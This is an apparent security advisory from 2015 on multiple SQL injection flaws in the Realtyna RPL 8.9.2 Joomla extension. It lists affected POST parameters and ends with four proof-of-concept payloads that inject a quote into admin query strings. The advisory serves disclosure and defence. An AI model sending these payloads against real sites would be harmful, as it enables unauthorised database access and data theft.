@@ -1,0 +1,47 @@
+Realtyna RPL 8.9.2 Joomla Extension Multiple SQL Injection Vulnerabilities
+
+
+Vendor: Realtyna LLC
+Product web page: https://www.realtyna.com
+Affected version: 8.9.2
+
+Summary: Realtyna CRM (Client Relationship Management) Add-on
+for RPL is a Real Estate CRM specially designed and developed
+based on business process and models required by Real Estate
+Agents/Brokers. Realtyna CRM intends to increase the Conversion
+Ratio of the website Visitors to Leads and then Leads to Clients.
+
+
+Desc: Realtyna RPL suffers from multiple SQL Injection vulnerabilities.
+Input passed via multiple POST parameters is not properly sanitised
+before being returned to the user or used in SQL queries. This can
+be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+Tested on: Apache
+           PHP/5.4.38
+		   MySQL/5.5.42-cll	
+
+Vulnerability discovered by Bikramaditya 'PhoenixX' Guha
+
+
+Advisory ID: ZSL-2015-5272
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5272.php
+Vendor: http://rpl.realtyna.com/Change-Logs/RPL7-Changelog
+CVE ID: CVE-2015-7714
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7714
+
+
+05.10.2015
+
+--
+
+
+http://localhost/administrator/index.php
+POST parameters: id, copy_field, pshow, css, tip, cat_id, text_search, plisting, pwizard
+
+Payloads:
+
+- option=com_rpl&view=addon_membership_members&format=edit&id=84'
+- option=com_rpl&view=property_structure&format=ajax&function=new_field&id=3004'&type=text
+- option=com_rpl&view=rpl_multilingual&format=ajax&function=data_copy&copy_field=308'&copy_from=&copy_to=en_gb&copy_method=1
+- option=com_rpl&view=property_structure&format=ajax&function=update_field&id=3002&options=0&css=&tip=&style=&name=&cat_id=1&text_search=0&plisting=0&pshow=1'&pwizard=1&mode=add
